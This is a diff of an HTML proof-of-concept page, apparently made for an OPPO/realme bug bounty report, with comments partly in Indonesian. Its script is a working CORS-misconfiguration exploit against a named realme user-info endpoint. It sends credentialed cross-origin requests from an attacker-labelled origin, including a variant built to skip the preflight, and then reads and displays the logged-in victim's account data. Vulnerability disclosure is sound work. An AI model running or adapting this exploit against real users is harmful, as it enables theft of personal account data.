@@ -20,7 +20,6 @@
         max-width: 860px;
         margin: 0 auto;
       }
-
       .badge {
         display: inline-block;
         background: #da3633;
@@ -47,7 +46,6 @@
       .meta span {
         color: #58a6ff;
       }
-
       .card {
         background: #161b22;
         border: 1px solid #30363d;
@@ -71,7 +69,7 @@
       }
       .info-key {
         color: #8b949e;
-        min-width: 80px;
+        min-width: 90px;
         flex-shrink: 0;
       }
       .info-val {
@@ -81,15 +79,20 @@
       .info-val.green {
         color: #56d364;
       }
-
+      .btn-row {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 10px;
+      }
       button {
         background: #238636;
         color: #fff;
         border: none;
-        padding: 10px 24px;
+        padding: 9px 20px;
         border-radius: 6px;
         font-family: inherit;
-        font-size: 13px;
+        font-size: 12px;
         font-weight: bold;
         cursor: pointer;
         transition: background 0.15s;
@@ -102,7 +105,18 @@
         color: #8b949e;
         cursor: not-allowed;
       }
-
+      button.secondary {
+        background: #1f6feb;
+      }
+      button.secondary:hover {
+        background: #388bfd;
+      }
+      button.danger {
+        background: #b62324;
+      }
+      button.danger:hover {
+        background: #da3633;
+      }
       #status {
         font-size: 12px;
         margin-top: 10px;
@@ -118,7 +132,6 @@
       #status.loading {
         color: #e3b341;
       }
-
       pre {
         background: #0d1117;
         border: 1px solid #30363d;
@@ -130,37 +143,20 @@
         white-space: pre-wrap;
         word-break: break-all;
         color: #c9d1d9;
-        min-height: 60px;
+        min-height: 50px;
       }
       .highlight {
         color: #f8c555;
       }
-
-      .steps {
-        font-size: 12px;
-        color: #8b949e;
-        line-height: 2;
-        counter-reset: step;
-      }
-      .steps li {
-        counter-increment: step;
-        list-style: none;
-        padding-left: 4px;
-      }
-      .steps li::before {
-        content: counter(step) ". ";
-        color: #58a6ff;
-      }
-
       .cors-proof {
         display: flex;
-        gap: 12px;
+        gap: 10px;
         margin-top: 12px;
         flex-wrap: wrap;
       }
       .pill {
         font-size: 11px;
-        padding: 4px 10px;
+        padding: 3px 10px;
         border-radius: 20px;
         border: 1px solid;
       }
@@ -176,6 +172,34 @@
         border-color: #58a6ff;
         color: #79c0ff;
       }
+      .log-line {
+        font-size: 11px;
+        color: #8b949e;
+        padding: 2px 0;
+        border-bottom: 1px solid #21262d;
+      }
+      .log-line .ts {
+        color: #3d444d;
+        margin-right: 8px;
+      }
+      .log-line .msg {
+      }
+      .log-line.ok .msg {
+        color: #56d364;
+      }
+      .log-line.err .msg {
+        color: #f85149;
+      }
+      .log-line.info .msg {
+        color: #79c0ff;
+      }
+      .log-line.warn .msg {
+        color: #e3b341;
+      }
+      #log {
+        max-height: 160px;
+        overflow-y: auto;
+      }
     </style>
   </head>
   <body>
@@ -186,14 +210,14 @@
         Target&nbsp;&nbsp;&nbsp;
         <span>https://id-sg.realme.com/uc/web/v1/user-info/query-basic</span
         ><br />
-        Origin&nbsp;&nbsp;&nbsp;&nbsp;
-        <span>https://ikur007.github.io</span> (attacker-controlled)<br />
-        Program&nbsp;&nbsp; <span>OPPO Bug Bounty — HackerOne / Bugcrowd</span>
+        Attacker <span>https://ikur007.github.io</span> (origin ini dikontrol
+        attacker)<br />
+        Program&nbsp;&nbsp; <span>OPPO / realme Bug Bounty</span>
       </div>
 
-      <!-- Attack Info -->
+      <!-- Vulnerability Summary -->
       <div class="card">
-        <div class="card-title">Vulnerability Details</div>
+        <div class="card-title">Vulnerability Summary</div>
         <div class="info-row">
           <span class="info-key">Type</span>
           <span class="info-val"
@@ -201,98 +225,180 @@
           >
         </div>
         <div class="info-row">
-          <span class="info-key">Impact</span>
-          <span class="info-val"
-            >Authenticated cross-origin read of user identity data</span
-          >
-        </div>
-        <div class="info-row">
           <span class="info-key">Root Cause</span>
           <span class="info-val green">
-            Server reflects any Origin in Access-Control-Allow-Origin<br />
-            AND sets Access-Control-Allow-Credentials: true
+            ACAO merefleksikan origin apa pun &amp; Allow-Credentials: true
           </span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Impact</span>
+          <span class="info-val"
+            >Halaman attacker bisa baca data user yang sudah login (session
+            theft via CORS)</span
+          >
         </div>
         <div class="cors-proof">
           <div class="pill green">Allow-Credentials: true</div>
           <div class="pill red">Origin Reflection: arbitrary</div>
-          <div class="pill blue">Method: POST</div>
-          <div class="pill blue">HTTP/2 200 OK</div>
+          <div class="pill blue">Verified di Burp Suite</div>
         </div>
       </div>
 
-      <!-- Reproduce Steps -->
+      <!-- PoC Controls -->
       <div class="card">
-        <div class="card-title">Steps to Reproduce</div>
-        <ol class="steps">
-          <li>
-            Victim logs in to id.realme.com (session cookie
-            <code>acIdAuthSession</code> is set)
-          </li>
-          <li>
-            Victim visits attacker's page (this PoC hosted on ikur007.github.io)
-          </li>
-          <li>
-            This page fires a cross-origin POST to the user-info endpoint with
-            <code>credentials: 'include'</code>
-          </li>
-          <li>
-            Browser sends victim's session cookie automatically — server
-            reflects attacker's Origin
-          </li>
-          <li>
-            Attacker's JS reads the response and exfiltrates victim's user data
-          </li>
-        </ol>
-      </div>
-
-      <!-- Live PoC -->
-      <div class="card">
-        <div class="card-title">Live Exploit</div>
-        <div style="margin-bottom: 12px; font-size: 12px; color: #8b949e">
-          Pastikan kamu sudah login di
-          <span style="color: #58a6ff">id.realme.com</span> di browser yang sama
-          sebelum klik tombol di bawah.
+        <div class="card-title">Live Exploit — Pilih Mode</div>
+        <div style="font-size: 12px; color: #8b949e; margin-bottom: 14px">
+          Pastikan kamu sudah
+          <strong style="color: #f0f6fc">login di id.realme.com</strong> di tab
+          lain browser ini.<br />
+          Coba <b>Mode 1</b> dulu (simple request, tanpa preflight). Kalau
+          gagal, coba Mode 2 (dengan headers lengkap).
         </div>
-        <button id="btnExploit" onclick="runExploit()">
-          ▶ Run PoC — Steal User Data
-        </button>
+        <div class="btn-row">
+          <button onclick="runMode1()">
+            ▶ Mode 1 — Simple Request (no preflight)
+          </button>
+          <button class="secondary" onclick="runMode2()">
+            ▶ Mode 2 — Full Headers
+          </button>
+          <button class="danger" onclick="runPreflightCheck()">
+            🔍 Cek Preflight OPTIONS dulu
+          </button>
+        </div>
         <div id="status"></div>
+      </div>
+
+      <!-- Live Log -->
+      <div class="card">
+        <div class="card-title">Debug Log</div>
+        <div id="log">
+          <div class="log-line info">
+            <span class="ts">--:--:--</span
+            ><span class="msg">Menunggu exploit dijalankan...</span>
+          </div>
+        </div>
       </div>
 
       <!-- Response Headers -->
       <div class="card">
-        <div class="card-title">Captured Response Headers</div>
+        <div class="card-title">Captured CORS Response Headers</div>
         <pre id="outputHeaders">— belum dijalankan —</pre>
       </div>
 
       <!-- Response Body -->
       <div class="card">
-        <div class="card-title">Leaked Response Body (User Data)</div>
+        <div class="card-title">Leaked Response Body</div>
         <pre id="outputBody">— belum dijalankan —</pre>
       </div>
     </div>
 
     <script>
-      async function runExploit() {
-        const btn = document.getElementById("btnExploit");
-        const status = document.getElementById("status");
-        const headersEl = document.getElementById("outputHeaders");
-        const bodyEl = document.getElementById("outputBody");
+      const TARGET = "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
 
-        btn.disabled = true;
-        status.className = "loading";
-        status.textContent = "⏳ Firing cross-origin request...";
-        headersEl.textContent = "...";
-        bodyEl.textContent = "...";
+      function ts() {
+        return new Date().toTimeString().slice(0, 8);
+      }
+      function addLog(msg, type = "info") {
+        const log = document.getElementById("log");
+        const div = document.createElement("div");
+        div.className = `log-line ${type}`;
+        div.innerHTML = `<span class="ts">${ts()}</span><span class="msg">${msg}</span>`;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
+      }
 
-        const TARGET =
-          "https://id-sg.realme.com/uc/web/v1/user-info/query-basic";
+      function setStatus(msg, cls) {
+        const s = document.getElementById("status");
+        s.className = cls;
+        s.textContent = msg;
+      }
+
+      function showHeaders(resp) {
+        const keys = [
+          "access-control-allow-origin",
+          "access-control-allow-credentials",
+          "access-control-allow-methods",
+          "access-control-allow-headers",
+          "content-type",
+          "x-backend-host",
+          "x-gateway-host",
+        ];
+        let out = "";
+        keys.forEach((k) => {
+          const v = resp.headers.get(k);
+          if (v) out += `<span class="highlight">${k}</span>: ${v}\n`;
+        });
+        document.getElementById("outputHeaders").innerHTML =
+          out || "(tidak ada header CORS yang terbaca)";
+      }
+
+      // Mode 1: Simple request — Content-Type: text/plain, body kosong
+      // Tidak trigger preflight OPTIONS karena tidak pakai custom headers
+      async function runMode1() {
+        addLog("Mode 1: simple request tanpa custom headers...", "info");
+        setStatus("⏳ Sending simple CORS request...", "loading");
+        document.getElementById("outputHeaders").textContent = "...";
+        document.getElementById("outputBody").textContent = "...";
+
+        try {
+          // Simple request: hanya pakai text/plain supaya tidak trigger preflight
+          const resp = await fetch(TARGET, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+              "Content-Type": "text/plain", // simple request — no preflight
+            },
+            body: "{}",
+          });
+
+          addLog(
+            `Response status: HTTP ${resp.status}`,
+            resp.ok ? "ok" : "warn",
+          );
+          showHeaders(resp);
+
+          const acao = resp.headers.get("access-control-allow-origin");
+          const acac = resp.headers.get("access-control-allow-credentials");
+
+          const body = await resp.text();
+          document.getElementById("outputBody").textContent = body || "(empty)";
+
+          if (acao && acao !== "null") {
+            addLog(
+              `✅ CORS bypass! ACAO: ${acao} | Credentials: ${acac}`,
+              "ok",
+            );
+            setStatus(
+              `✅ CORS bypass CONFIRMED! Origin direfleksikan: ${acao}`,
+              "ok",
+            );
+          } else {
+            addLog(
+              `⚠️ ACAO tidak terbaca: ${acao} — coba Mode 2 atau cek Preflight`,
+              "warn",
+            );
+            setStatus(`⚠️ ACAO: ${acao} — coba Mode 2`, "err");
+          }
+        } catch (e) {
+          addLog(`❌ Fetch error: ${e.message}`, "err");
+          setStatus("❌ Request gagal: " + e.message, "err");
+          document.getElementById("outputHeaders").textContent = e.toString();
+          document.getElementById("outputBody").textContent =
+            "Error — lihat log & console browser (F12)";
+        }
+      }
+
+      // Mode 2: Full custom headers (sama persis seperti di Burp)
+      async function runMode2() {
+        addLog("Mode 2: request dengan full custom headers...", "info");
+        setStatus("⏳ Sending full headers CORS request...", "loading");
+        document.getElementById("outputHeaders").textContent = "...";
+        document.getElementById("outputBody").textContent = "...";
 
         try {
           const resp = await fetch(TARGET, {
             method: "POST",
-            credentials: "include", // <-- sends victim's cookies cross-origin
+            credentials: "include",
             headers: {
               "Content-Type": "application/json;charset=UTF-8",
               Accept: "application/json, text/plain, */*",
@@ -308,44 +414,82 @@
             body: JSON.stringify({}),
           });
 
-          // Collect response headers
-          const corsOrigin = resp.headers.get("Access-Control-Allow-Origin");
-          const corsCreds = resp.headers.get(
-            "Access-Control-Allow-Credentials",
+          addLog(
+            `Response status: HTTP ${resp.status}`,
+            resp.ok ? "ok" : "warn",
           );
-          const corsAllow = resp.headers.get("Access-Control-Allow-Methods");
-          const contentType = resp.headers.get("Content-Type");
-          const backendHost = resp.headers.get("X-Backend-Host");
+          showHeaders(resp);
 
-          headersEl.innerHTML =
-            `<span class="highlight">Access-Control-Allow-Origin</span>      : ${corsOrigin}\n` +
-            `<span class="highlight">Access-Control-Allow-Credentials</span>  : ${corsCreds}\n` +
-            `<span class="highlight">Access-Control-Allow-Methods</span>      : ${corsAllow}\n` +
-            `Content-Type                          : ${contentType}\n` +
-            `X-Backend-Host                        : ${backendHost}`;
+          const acao = resp.headers.get("access-control-allow-origin");
+          const acac = resp.headers.get("access-control-allow-credentials");
 
-          // Read body
-          const rawBody = await resp.text();
-          bodyEl.textContent = rawBody || "(empty body)";
+          const body = await resp.text();
+          document.getElementById("outputBody").textContent = body || "(empty)";
 
-          // Check actual CORS bypass
-          const currentOrigin = window.location.origin;
-          if (corsOrigin === currentOrigin && corsCreds === "true") {
-            status.className = "ok";
-            status.textContent = `✅ CORS bypass confirmed! Server reflected origin: ${currentOrigin} — credentials accepted. HTTP ${resp.status}`;
+          if (acao && acao !== "null") {
+            addLog(
+              `✅ CORS bypass! ACAO: ${acao} | Credentials: ${acac}`,
+              "ok",
+            );
+            setStatus(
+              `✅ CORS bypass CONFIRMED! Origin direfleksikan: ${acao}`,
+              "ok",
+            );
           } else {
-            status.className = "err";
-            status.textContent = `⚠️ Origin tidak direfleksikan. ACAO: ${corsOrigin}`;
+            addLog(
+              `⚠️ ACAO tidak terbaca. Mungkin preflight gagal — buka F12 Console`,
+              "warn",
+            );
+            setStatus(
+              `⚠️ ACAO null — cek F12 Console untuk detail error`,
+              "err",
+            );
           }
-        } catch (err) {
-          status.className = "err";
-          status.textContent =
-            "❌ Request gagal (mungkin tidak ada session aktif, atau endpoint butuh body terenkripsi): " +
-            err.message;
-          headersEl.textContent = err.toString();
-          bodyEl.textContent = "—";
-        } finally {
-          btn.disabled = false;
+        } catch (e) {
+          addLog(`❌ Fetch error: ${e.message}`, "err");
+          setStatus("❌ Request gagal: " + e.message, "err");
+          document.getElementById("outputHeaders").textContent = e.toString();
+          document.getElementById("outputBody").textContent = "Error";
+        }
+      }
+
+      // Cek preflight OPTIONS dulu
+      async function runPreflightCheck() {
+        addLog("Mengirim OPTIONS preflight manual...", "info");
+        setStatus("⏳ Checking preflight OPTIONS...", "loading");
+
+        try {
+          const resp = await fetch(TARGET, {
+            method: "OPTIONS",
+            credentials: "include",
+            headers: {
+              "Access-Control-Request-Method": "POST",
+              "Access-Control-Request-Headers":
+                "content-type,x-biz-appkey,x-device-brand",
+              Origin: window.location.origin,
+            },
+          });
+
+          addLog(`Preflight status: ${resp.status}`, resp.ok ? "ok" : "warn");
+          showHeaders(resp);
+
+          const acao = resp.headers.get("access-control-allow-origin");
+          if (acao) {
+            addLog(`✅ Preflight OK! ACAO: ${acao}`, "ok");
+            setStatus(`✅ Preflight berhasil — sekarang coba Mode 2`, "ok");
+          } else {
+            addLog(
+              "⚠️ Preflight tidak return ACAO — server mungkin block preflight dari origin ini",
+              "warn",
+            );
+            setStatus(
+              "⚠️ Preflight failed — server tidak izinkan cross-origin preflight",
+              "err",
+            );
+          }
+        } catch (e) {
+          addLog(`❌ Preflight error: ${e.message}`, "err");
+          setStatus("❌ Preflight gagal: " + e.message, "err");
         }
       }
     </script>
